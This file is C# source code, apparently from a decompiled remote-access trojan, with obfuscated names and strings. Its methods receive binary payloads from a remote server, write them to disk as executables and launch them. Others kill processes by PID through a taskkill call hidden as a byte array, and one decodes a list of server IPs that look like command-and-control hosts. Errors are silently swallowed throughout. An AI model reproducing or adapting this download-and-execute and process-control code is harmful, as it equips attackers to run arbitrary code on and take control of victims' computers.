using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace fhlergarw;

internal class fhlergarwOCMD
{
	public fhlergarwMCDM server;

	public fhlergarwOCMD(fhlergarwMCDM lID)
	{
		server = lID;
	}

	public void fhlergarwdo_updated(int uType, string switchType)
	{
		try
		{
			byte[] array = server.fhlergarwpull_data();
			if (uType == 7 && array != null)
			{
				string text = fhlergarwCONF.fhlergarwget_mpath() + "tmps\\";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(text + fhlergarwCONF.fhlergarwmainApp + ".exe|fhlergarw".Split(new char[1] { '|' })[0], array);
				fhlergarwdo_process(text + fhlergarwCONF.fhlergarwmainApp + ".exe|fhlergarw".Split(new char[1] { '|' })[0], null, sendExp: true);
			}
		}
		catch
		{
		}
	}

	public NetworkStream fhlergarwNS(TcpClient fhlergarwtcpsck)
	{
		return fhlergarwtcpsck.GetStream();
	}

	public void fhlergarwdo_process(string filePath, string parms, bool sendExp)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = filePath;
			if (parms != null && parms != "")
			{
				process.StartInfo.Arguments = parms;
			}
			process.Start();
		}
		catch
		{
		}
	}

	public void fhlergarwbreak_process(int proid)
	{
		try
		{
			try
			{
				Thread.Sleep(100);
				Process.GetProcessById(proid).Kill();
				Thread.Sleep(100);
			}
			catch
			{
				fhlergarwdieProcess(Process.GetProcessById(proid));
			}
		}
		catch
		{
		}
	}

	public void fhlergarwdieProcess(Process p)
	{
		try
		{
			if (p != null)
			{
				Process process = new Process();
				byte[] array = new byte[12]
				{
					116, 97, 115, 107, 107, 105, 108, 108, 46, 101,
					120, 101
				};
				process.StartInfo.FileName = Encoding.UTF8.GetString(array, 0, array.Length);
				process.StartInfo.Arguments = "/PID |fhlergarw".Split(new char[1] { '|' })[0] + p.Id + " /T /F|fhlergarw".Split(new char[1] { '|' })[0];
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				process.WaitForExit();
			}
		}
		catch
		{
		}
	}

	public void fhlergarwremove_user()
	{
		try
		{
			byte[] array = server.fhlergarwpull_data();
			if (array != null && !File.Exists(fhlergarwCONF.fhlergarwget_mpath() + fhlergarwCONF.fhlergarwremvUser + ".exe"))
			{
				File.WriteAllBytes(fhlergarwCONF.fhlergarwget_mpath() + fhlergarwCONF.fhlergarwremvUser + ".exe", array);
				fhlergarwdo_process(fhlergarwCONF.fhlergarwget_mpath() + fhlergarwCONF.fhlergarwremvUser + ".exe", null, sendExp: false);
			}
		}
		catch
		{
		}
	}

	public string[] fhlergarwserverIPD()
	{
		string @string = Encoding.UTF8.GetString(fhlergarwCONF.fhlergarwvpsips, 0, fhlergarwCONF.fhlergarwvpsips.Length);
		return @string.Split(new char[1] { '?' });
	}
}
